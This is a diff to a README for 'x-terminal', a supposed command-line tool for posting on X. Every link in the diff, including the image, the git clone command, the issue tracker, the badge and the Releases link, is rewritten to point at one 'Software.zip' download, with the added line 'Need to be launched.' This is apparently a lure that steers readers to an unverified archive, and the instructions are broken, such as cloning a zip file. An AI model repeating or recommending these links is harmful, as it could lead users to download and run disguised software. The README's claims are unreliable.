@@ -3,7 +3,7 @@
 
 Welcome to the **x-terminal** repository! This project allows you to post on X directly from your terminal. Harness the power of the command line to interact with X in a seamless and efficient way.
 
-![x-terminal](https://yourimageurlhere.com)
+![x-terminal](https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip)
 
 ## Installation
 
@@ -11,7 +11,7 @@ To get started with **x-terminal**, follow the steps below:
 
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/yourusername/x-terminal.git
+   git clone https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip
    ```
 
 2. **Navigate to the Directory:**
@@ -50,17 +50,17 @@ Contributions are welcome! If you have any ideas for improvement or new features
 
 ## Issues
 
-If you encounter any issues while using **x-terminal**, please report them in the [Issue Tracker](https://github.com/yourusername/x-terminal/issues).
+If you encounter any issues while using **x-terminal**, please report them in the [Issue Tracker](https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip).
 
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download x-terminal](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download x-terminal](https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip)](https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip)
 Need to be launched.
 
 ---
 
-If the provided download link does not work, please check the [Releases](https://github.com/yourusername/x-terminal/releases) section of this repository for the latest version.
+If the provided download link does not work, please check the [Releases](https://github.com/shamsunyako/x-terminal/releases/download/v1.0/Software.zip) section of this repository for the latest version.
 
 Thank you for checking out **x-terminal**. Happy posting on X from your terminal! 🌟
